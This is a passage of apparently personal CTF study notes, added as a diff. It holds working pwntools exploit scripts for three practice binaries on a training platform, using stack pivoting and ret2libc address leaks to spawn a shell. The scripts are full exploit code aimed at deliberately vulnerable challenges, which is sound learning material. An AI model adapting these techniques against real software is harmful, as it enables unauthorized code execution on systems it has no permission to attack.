+1.  [frame faking](https://g.yuque.com/goldrick/pl0aqm/ccd1iu)
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './ciscn_2019_es_2'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 27104)
+
+log.level = 'DEBUG'
+for k, v in e.got.items():
+    log.debug(f'got:{k}={hex(v)}')
+
+p.recvuntil(b"\n")
+
+ra_offset = 0x28
+leaked_offset = 0x50
+call_system = 0x08048559
+leave_ret = 0x080485fd
+payload_leak_mem = b'0'*0x20
+
+
+p.sendline(payload_leak_mem)
+p.recvuntil(payload_leak_mem)
+leaked_addr = u32(p.recv(6*4)[-4:])
+buffer_addr = leaked_addr - leaked_offset
+log.success(f'leaked={hex(leaked_addr)}, buffer={hex(buffer_addr)}')
+
+# TODO HINT
+# Frame faking
+pivot = b'sh\x00'
+payload = p32(buffer_addr) + p32(call_system) + p32(buffer_addr+0xc) + pivot + b'1'*(ra_offset - len(pivot) - 0xc) + p32(buffer_addr) + p32(leave_ret)
+# payload = p32(leave_ret) + p32(call_system) + p32(buffer_addr+0xc) + pivot + b'1'*(ra_offset - len(pivot) - 0xc) + p32(buffer_addr) + p32(leave_ret)
+p.sendline(payload)
+p.interactive()
+```
+### [BJDCTF 2nd]test: 
+1.  Flaw: incomplete filters and privilege escalation using [shell(`x86_64`)](https://zhuanlan.zhihu.com/p/138482510)
+
+
+### spwn:
+1.  frame faking
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './spwn'
+e = ELF(filename)
+p = process(filename)
+# p = remote("node3.buuoj.cn", 27104)
+
+log.level = 'DEBUG'
+for k, v in e.got.items():
+    log.debug(f'got:{k}={hex(v)}')
+
+def say(name, content):
+    p.sendlineafter(b'name?', name)
+    p.sendafter(b'to say?', content)
+
+# TODO HINT:
+# vul_function() leads to an ill-formed frame after __libc_start_main is leaked
+ret_function = e.sym['main']
+# TODO HINT:
+# puts() can not be used here to leak GOT address. 
+# Because it increases the top of stack greatly to reach a READ ONLY segment resulting in SIGSEGV
+output_plt, c_func_got = e.plt['write'], e.got['__libc_start_main']
+leave_ret = 0x08048511
+ebp_offset = 0x18
+global_buf = 0x804a300
+
+payload_leave_ret = b'0'*ebp_offset + p32(global_buf) + p32(leave_ret)
+say(p32(global_buf) + p32(output_plt) + p32(ret_function) + p32(1) + p32(c_func_got) + p32(4), payload_leave_ret)
+c_func_addr = u32(p.recv(4))
+log.success(f'__libc_start_main={hex(c_func_addr)}')
+
+searcher = LibcSearcher(func='__libc_start_main', address=c_func_addr)
+base_addr = c_func_addr - searcher.dump('__libc_start_main')
+system_addr = base_addr + searcher.dump('system')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
+log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
+
+
+say(p32(global_buf) + p32(system_addr) + p32(ret_function) + p32(bin_sh_addr), payload_leave_ret)
+p.interactive()
+```
+
+### jarvisoj_level3
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './jarvisoj_level3'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 26246)
+
+log.level = 'DEBUG'
+for k, v in e.got.items():
+    log.debug(f'got:{k}={hex(v)}')
+
+ret_function = e.sym['main']
+write_plt, c_func_got = e.plt['write'], e.got['__libc_start_main']
+log.info(f'put:plt={hex(write_plt)}, __libc_start_main:got={hex(c_func_got)}')
+
+ebp_offset = 0x88
+p.sendlineafter(b'Input:\n', b'0'*(ebp_offset+4) + p32(write_plt) + p32(ret_function) + p32(1) + p32(c_func_got) + p32(4))
+c_func_addr = u32(p.recv(4))
+log.success(f'__libc_start_main={hex(c_func_addr)}')
+
+searcher = LibcSearcher()
+searcher.add_condition('__libc_start_main', c_func_addr)
+base_addr = c_func_addr - searcher.dump('__libc_start_main')
+system_addr = base_addr + searcher.dump('system')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
+log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
+ 
+p.sendlineafter(b'Input:\n', b'1'*(ebp_offset + 4) + p32(system_addr) + p32(ret_function) + p32(bin_sh_addr))
+p.interactive()
+```
